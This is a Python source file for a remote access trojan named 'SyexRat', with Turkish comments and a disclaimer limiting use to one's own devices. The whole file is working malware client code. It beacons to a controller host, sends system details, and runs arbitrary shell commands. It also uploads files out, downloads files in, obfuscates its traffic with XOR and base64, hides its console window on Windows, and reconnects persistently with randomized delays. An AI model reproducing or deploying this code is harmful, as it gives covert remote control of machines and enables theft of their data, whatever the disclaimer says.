#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SyexRat - Client/Agent
Kendi cihazlarınız arasındaki test için. KENDİ cihazlarınız dışında kullanmayın.
"""

import socket
import subprocess
import os
import sys
import platform
import time
import base64
import threading
import json
import random
import string

# ============ AYARLAR ============
SERVER_HOST = "0.0.0.0"   # <-- Kontrol cihazının LAN IP'si
SERVER_PORT = 2350
RECONNECT_DELAY = 5
KEY = b"SyexSecretKey2026"      # XOR anahtarı - değiştirin!
# =================================


def xor_crypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def encode_packet(data: bytes) -> bytes:
    """Şifrele + base64 + uzunluk ön eki (4 byte)"""
    enc = base64.b64encode(xor_crypt(data, KEY))
    return len(enc).to_bytes(4, 'big') + enc


def recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Baglanti kesildi")
        buf += chunk
    return buf


def decode_packet(sock: socket.socket) -> bytes:
    length = int.from_bytes(recv_exact(sock, 4), 'big')
    enc = recv_exact(sock, length)
    return xor_crypt(base64.b64decode(enc), KEY)


def get_sysinfo() -> dict:
    return {
        "os": platform.system(),
        "os_version": platform.version(),
        "hostname": platform.node(),
        "user": os.getenv("USERNAME") or os.getenv("USER") or "?",
        "cwd": os.getcwd(),
        "pid": os.getpid(),
    }


def run_command(cmd: str) -> bytes:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
        out = r.stdout + r.stderr
        return out if out else b"[+] Komut tamamlandi (cikti yok)."
    except subprocess.TimeoutExpired:
        return b"[-] Zaman asimi (120s)."
    except Exception as e:
        return f"[-] Hata: {e}".encode()


def send_file(sock: socket.socket, filepath: str) -> bytes:
    """Dosyayi kontrol cihazina yukle (download komutu)"""
    try:
        filepath = os.path.abspath(filepath)
        if not os.path.isfile(filepath):
            return f"[-] Dosya yok: {filepath}".encode()

        size = os.path.getsize(filepath)
        # JSON metadata gonder
        meta = json.dumps({"file": os.path.basename(filepath), "size": size}).encode()
        sock.sendall(encode_packet(b"__FILE__" + meta))

        with open(filepath, 'rb') as f:
            sent = 0
            while sent < size:
                chunk = f.read(65536)
                if not chunk:
                    break
                sock.sendall(encode_packet(chunk))
                sent += len(chunk)

        return f"[+] Dosya gonderildi: {filepath} ({size} bayt)".encode()
    except Exception as e:
        return f"[-] Dosya hatasi: {e}".encode()


def recv_file(sock: socket.socket) -> bytes:
    """Kontrol cihazindan dosya indir (upload komutu)"""
    try:
        raw = decode_packet(sock)
        if not raw.startswith(b"__FILE__"):
            return b"[-] Beklenmedik veri."
        meta = json.loads(raw[8:])
        filename = meta["file"]
        size = meta["size"]

        received = 0
        with open(filename, 'wb') as f:
            while received < size:
                chunk = decode_packet(sock)
                f.write(chunk)
                received += len(chunk)

        return f"[+] Dosya alindi: {filename} ({received} bayt)".encode()
    except Exception as e:
        return f"[-] Dosya hatasi: {e}".encode()


def worker(sock: socket.socket):
    """Komut döngüsü"""
    while True:
        try:
            cmd = decode_packet(sock).decode("utf-8", errors="replace").strip()
        except (ConnectionError, OSError):
            return  # bağlantı koptu, yeniden bağlan

        if not cmd:
            continue

        if cmd == "exit":
            sock.close()
            sys.exit(0)

        elif cmd == "sysinfo":
            info = get_sysinfo()
            report = (f"OS: {info['os']} {info['os_version']}\n"
                      f"Host: {info['hostname']}\n"
                      f"User: {info['user']}\n"
                      f"CWD: {info['cwd']}\n"
                      f"PID: {info['pid']}")
            sock.sendall(encode_packet(report.encode()))

        elif cmd == "ping":
            sock.sendall(encode_packet(b"[+]pong " + str(time.time()).encode()))

        elif cmd.startswith("download "):
            # client -> server dosya gönderme
            path = cmd[9:].strip()
            sock.sendall(encode_packet(send_file(sock, path)))

        elif cmd.startswith("upload "):
            # server -> client dosya alma
            sock.sendall(encode_packet(recv_file(sock)))

        elif cmd.startswith("cd "):
            try:
                os.chdir(os.path.expanduser(cmd[3:].strip()))
                sock.sendall(encode_packet(f"[+] CWD: {os.getcwd()}".encode()))
            except OSError as e:
                sock.sendall(encode_packet(f"[-] {e}".encode()))

        else:
            out = run_command(cmd)
            sock.sendall(encode_packet(out))


def main():
    if platform.system() == "Windows":
        # Konsol penceresini gizle (Windows test)
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(
                __import__("ctypes").windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            # İlk paket: sistem bilgisi
            s.sendall(encode_packet(json.dumps(get_sysinfo()).encode()))
            worker(s)
        except (socket.error, OSError):
            pass
        finally:
            try:
                s.close()
            except Exception:
                pass
        time.sleep(RECONNECT_DELAY + random.uniform(0, 2))


if __name__ == "__main__":
    main()
